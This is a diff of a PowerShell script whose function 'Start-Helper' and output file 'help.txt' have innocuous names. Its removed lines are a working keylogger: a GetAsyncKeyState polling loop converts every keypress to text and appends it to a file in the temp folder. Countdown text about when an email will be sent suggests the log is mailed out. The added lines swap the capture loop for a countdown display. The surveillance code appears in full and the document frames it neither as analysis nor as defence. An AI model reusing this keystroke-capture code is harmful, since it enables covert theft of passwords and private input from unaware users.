@@ -27,37 +27,11 @@ function Start-Helper($Path="$env:temp\help.txt") {
     $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
     $TimeNow = Get-Date
 
-    $countdown = New-Object System.Timers.Timer
-    $countdown.Interval = 1000  # 1 second
-    $countdown.Enabled = $true
-    $countdown.AutoReset = $true
-    $countdown.Start()
-
-    $countdown.add_Elapsed({
-        $TimeLeft = $TimeEnd - (Get-Date)
-        Write-Host "Time left to send email: $($TimeLeft.ToString("mm\:ss"))"
-    })
-
     while ($TimesToRun -ge 1) {
         while ($TimeEnd -ge $TimeNow) {
-            Start-Sleep -Milliseconds 40
-            for ($ascii = 9; $ascii -le 254; $ascii++) {
-                $state = $API::GetAsyncKeyState($ascii)
-
-                if ($state -eq -32767) {
-                    $null = [console]::CapsLock
-
-                    $virtualKey = $API::MapVirtualKey($ascii, 3)
-                    $kbstate = New-Object Byte[] 256
-                    $checkkbstate = $API::GetKeyboardState($kbstate)
-                    $mychar = New-Object -TypeName System.Text.StringBuilder
-                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-                    if ($success) {
-                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-                    }
-                }
-            }
+            $TimeLeft = $TimeEnd - (Get-Date)
+            Write-Host -NoNewline "Time left to send email: $($TimeLeft.ToString("mm\:ss"))`r"
+            Start-Sleep -Seconds 1
             $TimeNow = Get-Date
         }
 
